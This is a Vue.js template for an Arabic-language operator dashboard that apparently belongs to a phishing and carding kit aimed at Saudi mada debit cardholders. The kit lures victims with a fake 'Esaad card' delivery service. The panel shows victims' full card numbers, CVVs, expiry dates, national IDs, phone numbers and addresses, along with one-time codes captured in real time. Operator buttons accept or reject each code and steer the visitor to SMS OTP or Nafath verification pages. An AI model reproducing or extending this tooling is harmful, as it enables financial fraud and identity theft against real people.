                    <div class="flex items-center justify-between mb-3">
                      <button
                        @click="copyText(selectedRequest.cardNumber, 'card')"
                        class="font-mono text-[15px] font-semibold tracking-wider text-gray-900 hover:text-[#1976d2] cursor-pointer select-all tabular-nums"
                        title="انقر لنسخ رقم البطاقة"
                      >
                        {{ formatCardNumberSpaced(selectedRequest.cardNumber) }}
                      </button>

                      <span class="font-mono text-xs font-semibold text-gray-800 tabular-nums select-all">
                        {{ selectedRequest.expMonth }}/{{ formatShortExpYear(selectedRequest.expYear) }}
                      </span>
                    </div>

                    <!-- Card Bottom Row: Holder Name + CVV -->
                    <div class="flex items-end justify-between">
                      <div>
                        <div class="text-xs font-medium text-gray-800 select-all mb-2">
                          {{ selectedRequest.paymentName || selectedRequest.name }}
                        </div>
                        <div class="w-4 h-3 rounded-xs bg-[#006c35] flex items-center justify-center">
                          <div class="w-2.5 h-0.5 bg-white/80"></div>
                        </div>
                      </div>

                      <div class="text-right">
                        <div class="text-[8px] text-gray-500 uppercase leading-none">CVV</div>
                        <div class="font-mono text-xs font-bold text-gray-900 select-all tabular-nums mb-1">
                          {{ selectedRequest.cvv }}
                        </div>
                        <div class="flex items-center gap-1.5 justify-end">
                          <span class="text-[8px] font-semibold text-gray-600 tracking-tight">DEBIT • PLATINUM</span>
                          <div class="px-1 py-0.2 bg-white/80 rounded-xs border border-gray-300 text-[7px] font-black text-[#1976d2]">
                            mada
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div
                    v-else
                    class="rounded-xl p-6 bg-white/70 border border-dashed border-gray-300 text-center text-xs text-gray-400"
                    dir="rtl"
                  >
                    بانتظار إدخال بيانات البطاقة...
                  </div>

                  <!-- Footer link inside Payment Card -->
                  <div class="mt-2.5 flex items-center justify-between" dir="rtl">
                    <span class="text-[11px] text-[#1976d2] font-semibold underline cursor-pointer">
                      {{ copiedField === 'card' ? 'تم النسخ!' : 'منقول' }}
                    </span>

                    <div v-if="selectedRequest.otp" class="flex items-center gap-2">
                      <span class="text-[11px] font-bold text-gray-700">
                        الرمز: <strong class="font-mono text-[#1976d2]">{{ selectedRequest.otp }}</strong>
                      </span>
                    </div>
                  </div>
                </div>

                <!-- Timestamp Divider 1 -->
                <div class="flex items-center justify-center gap-3 my-3 text-[10px] text-gray-400 font-mono">
                  <span class="w-12 h-px bg-gray-200"></span>
                  <span>{{ formatTimelineTimestamp(selectedRequest.createdAt) }}</span>
                  <span class="w-12 h-px bg-gray-200"></span>
                </div>

                <!-- ==================== CARD 2: حجز موعد / بيانات الطلب ==================== -->
                <div
                  class="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4 text-right"
                  dir="rtl"
                >
                  <div class="font-bold text-sm text-gray-700 mb-3">
                    حجز موعد
                  </div>

                  <div class="space-y-2 text-[12px] text-gray-800 font-medium leading-relaxed">
                    <div>
                      <span class="text-gray-600">الاسم : </span>
                      <span class="font-semibold text-gray-900 select-all">{{ selectedRequest.name }}</span>
                    </div>
                    <div>
                      <span class="text-gray-600">رقم الهوية : </span>
                      <span class="font-mono font-semibold text-gray-900 select-all tabular-nums">{{ selectedRequest.idNumber }}</span>
                    </div>
                    <div>
                      <span class="text-gray-600">رقم الجوال : </span>
                      <span class="font-mono font-semibold text-gray-900 select-all tabular-nums">{{ selectedRequest.mobile }}</span>
                    </div>
                    <div>
                      <span class="text-gray-600">العنوان : </span>
                      <span class="font-semibold text-gray-900 select-all">{{ selectedRequest.address || 'غير محدد' }}</span>
                    </div>
                    <div>
                      <span class="text-gray-600">فئة البطاقة : </span>
                      <span class="font-semibold text-gray-900">{{ formatCardTypeLabel(selectedRequest.cardType) }}</span>
                    </div>
                    <div>
                      <span class="text-gray-600">نوع الخدمة : </span>
                      <span class="font-semibold text-gray-900">إصدار وتوصيل بطاقة إسعاد</span>
                    </div>
                    <div>
                      <span class="text-gray-600">تاريخ الطلب : </span>
                      <span class="font-mono text-[11px] text-gray-800" dir="ltr">
                        {{ new Date(selectedRequest.createdAt).toUTCString() }}
                      </span>
                    </div>
                    <div>
                      <span class="text-gray-600">موعد الخدمة : </span>
                      <span class="font-semibold text-gray-900">{{ selectedRequest.date || '03:00 م' }}</span>
                    </div>
                    <div>
                      <span class="text-gray-600">رسوم الخدمة : </span>
                      <span class="font-mono font-semibold tabular-nums">100</span>
                    </div>
                    <div>
                      <span class="text-gray-600">ضريبة القيمة المضافة : </span>
                      <span class="font-mono font-semibold tabular-nums">15</span>
                    </div>
                    <div>
                      <span class="text-gray-600">مجموع : </span>
                      <span class="font-mono font-bold tabular-nums">115</span>
                    </div>
                  </div>
                </div>

                <!-- Timestamp Divider 2 -->
                <div class="flex items-center justify-center gap-3 my-3 text-[10px] text-gray-400 font-mono">
                  <span class="w-12 h-px bg-gray-200"></span>
                  <span>{{ formatTimelineTimestamp(selectedRequest.updatedAt) }}</span>
                  <span class="w-12 h-px bg-gray-200"></span>
                </div>

                <!-- ==================== CARD 3: الدفع & إجراءات التحقق ==================== -->
                <div
                  class="w-[345px] ml-auto bg-[#f1f3f5] rounded-lg p-4 border border-gray-200/80 mb-4 text-right"
                  dir="rtl"
                >
                  <div class="font-bold text-sm text-gray-700 mb-3">
                    الدفع والتحقق
                  </div>

                  <div v-if="selectedRequest.otp" class="space-y-3">
                    <div class="bg-white rounded-lg p-3 border border-gray-200 text-center">
                      <div class="text-[11px] text-gray-500 mb-1">رمز التحقق (OTP) المستلم:</div>
                      <div class="font-mono text-2xl font-black tracking-[0.3em] text-[#1976d2] select-all tabular-nums">
                        {{ selectedRequest.otp }}
                      </div>
                    </div>

                    <div class="flex gap-2">
                      <button
                        @click="updateOtpStatus(selectedRequest.id, 'approved')"
                        class="flex-1 bg-[#16a34a] hover:bg-[#15803d] text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
                      >
                        الرمز صحيح (قبول)
                      </button>
                      <button
                        @click="updateOtpStatus(selectedRequest.id, 'rejected')"
                        class="flex-1 bg-red-600 hover:bg-red-700 text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
                      >
                        الرمز خاطئ (رفض)
                      </button>
                    </div>
                  </div>

                  <div v-else class="space-y-2">
                    <p class="text-xs text-gray-600 mb-2">توجيه الزائر لصفحة التحقق المطلوبة:</p>
                    <div class="flex gap-2">
                      <button
                        @click="updateNextAction(selectedRequest.id, 'otp-sms')"
                        class="flex-1 bg-[#1976d2] hover:bg-[#1565c0] text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
                      >
                        تحقق SMS (OTP)
                      </button>
                      <button
                        @click="updateNextAction(selectedRequest.id, 'otp-bank')"
                        class="flex-1 bg-gray-800 hover:bg-gray-900 text-white py-2 rounded text-xs font-bold transition-colors cursor-pointer"
                      >
                        تنبية إتصال / نفاذ
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </template>

        <!-- Empty Selection State -->
        <div
          v-else
          class="flex-1 flex flex-col items-center justify-center text-gray-400 bg-[#fafafa]"
          dir="rtl"
        >
          <MessageSquare class="w-12 h-12 mb-3 text-gray-300" />
          <p class="text-sm font-bold text-gray-500">اختر محادثة من صندوق الوارد</p>
          <p class="text-xs text-gray-400 mt-1">انقر على أي زائر في القائمة اليمنى لعرض بيانات البطاقة والطلب</p>
        </div>
      </div>

      <!-- ==================== RIGHT SIDEBAR: VISITORS / CONVERSATIONS LIST ==================== -->
      <aside class="w-[290px] border-l border-gray-200 bg-white flex flex-col shrink-0 h-full">
        <!-- Sidebar Filter & Search Header -->
        <div class="h-[40px] border-b border-gray-200 px-3 flex items-center justify-between shrink-0">
          <!-- Left: Search Icon Button -->
          <button
            @click="showSearchInput = !showSearchInput"
            class="text-[#1976d2] hover:bg-blue-50 p-1 rounded cursor-pointer"
            title="بحث"
          >
            <Search class="w-4 h-4" />
          </button>

          <!-- Right: Filter Select + Checkbox -->
          <div class="flex items-center gap-2" dir="rtl">
            <input type="checkbox" class="w-3.5 h-3.5 rounded border-gray-300 accent-[#1976d2] cursor-pointer" />
            <div class="relative flex items-center">
              <select
                v-model="filterMode"
                class="appearance-none bg-transparent pr-1 pl-5 py-1 text-xs font-bold text-gray-700 focus:outline-none cursor-pointer"
              >
                <option value="all">كل المحادثات</option>
                <option value="online">المتصلون الآن</option>
                <option value="card">بيانات البطاقة</option>
                <option value="otp">بانتظار رمز OTP</option>
                <option value="archived">المؤرشفة</option>
              </select>
              <ChevronDown class="w-3.5 h-3.5 text-gray-500 absolute left-0 pointer-events-none" />
            </div>
          </div>
        </div>

        <!-- Collapsible Search Bar -->
        <div v-if="showSearchInput" class="p-2 border-b border-gray-100 bg-gray-50" dir="rtl">
          <input
            v-model="searchQuery"
            type="text"
            placeholder="بحث بالاسم، الهوية، الجوال، البطاقة..."
            class="w-full bg-white border border-gray-300 rounded px-2.5 py-1 text-xs focus:outline-none focus:border-[#1976d2]"
          />
        </div>

        <!-- Loading / Error / Empty States -->
        <div v-if="loading" class="flex-1 flex flex-col items-center justify-center text-gray-400 p-6">
          <RefreshCw class="w-6 h-6 animate-spin text-[#1976d2] mb-2" />
          <span class="text-xs">جاري التحميل...</span>
        </div>

        <div v-else-if="error" class="p-4 text-center text-xs text-red-600" dir="rtl">
          {{ error }}
        </div>

        <div
          v-else-if="filteredRequests.length === 0"
          class="flex-1 flex flex-col items-center justify-center text-gray-400 p-6 text-xs"
          dir="rtl"
        >
          لا توجد محادثات مطابقة
        </div>

        <!-- Visitors List -->
        <div v-else class="flex-1 overflow-y-auto divide-y divide-gray-100">
          <div
            v-for="req in filteredRequests"
            :key="req.id"
            @click="selectedRequestId = req.id"
            class="px-3 py-3 cursor-pointer transition-colors flex items-center justify-between gap-2"
            :class="selectedRequestId === req.id ? 'bg-[#cfe4ff]' : 'hover:bg-gray-50 bg-white'"
          >
            <!-- Left Column: Relative Time + Status Badges + Quick Delete -->
            <div class="flex flex-col items-start justify-between self-stretch shrink-0">
              <div class="flex items-center gap-1.5">
                <button
                  @click="handleDeleteRequest(req.id, $event)"
                  :disabled="isDeleting === req.id"
                  class="text-gray-400 hover:text-red-600 p-0.5 rounded hover:bg-red-50 transition-colors cursor-pointer"
                  title="حذف المحادثة"
                >
                  <Trash2 class="w-3 h-3" />
                </button>
                <span class="text-[10px] text-gray-400 font-medium" dir="rtl">
                  {{ formatRelativeTimeShort(req.updatedAt || req.createdAt) }}
                </span>
              </div>

              <div class="flex items-center gap-1 mt-1">
                <MoreHorizontal
                  v-if="selectedRequestId === req.id || onlineUsers[req.id]"
                  class="w-3.5 h-3.5 text-[#1976d2]"
                />
                <span
                  v-if="req.cardNumber"
                  class="inline-flex items-center px-1 py-0.2 bg-emerald-50 border border-emerald-200 rounded-xs text-[8px] font-bold text-emerald-700"
                >
                  CARD
                </span>
                <span
                  v-if="req.otp"
                  class="inline-flex items-center px-1 py-0.2 bg-amber-50 border border-amber-300 rounded-xs text-[8px] font-bold text-amber-700"
                >
                  OTP
                </span>
              </div>
            </div>

            <!-- Right Column: Name + Current Page + Avatar with Flag -->
            <div class="flex items-center gap-2.5 min-w-0">
              <div class="text-right min-w-0" dir="rtl">
                <div class="text-[13px] font-bold text-gray-800 truncate max-w-[150px]">
                  {{ req.name || 'زائر جديد' }}
                </div>
                <div class="text-[11px] text-[#526b84] font-medium truncate max-w-[150px] mt-0.5">
                  {{ getRequestCurrentPageLabel(req) }}
                </div>
              </div>

              <!-- Grey Avatar with Silhouette + Bottom-Left Flag Badge -->
              <div class="relative shrink-0">
                <div class="w-10 h-10 rounded-full bg-[#d1d5db] flex items-center justify-center text-white overflow-hidden">
                  <User class="w-6 h-6 fill-white text-white mt-1" />
                </div>
                <!-- Small Flag Badge at bottom-left of avatar -->
                <div
                  class="absolute -bottom-0.5 -left-0.5 w-3.5 h-2.5 rounded-[2px] bg-[#006c35] border border-white flex items-center justify-center shadow-2xs"
                  :class="onlineUsers[req.id] ? 'ring-1 ring-[#16a34a]' : ''"
                >
                  <div class="w-2 h-[1px] bg-white"></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </aside>
    </div>
  </div>
</template>
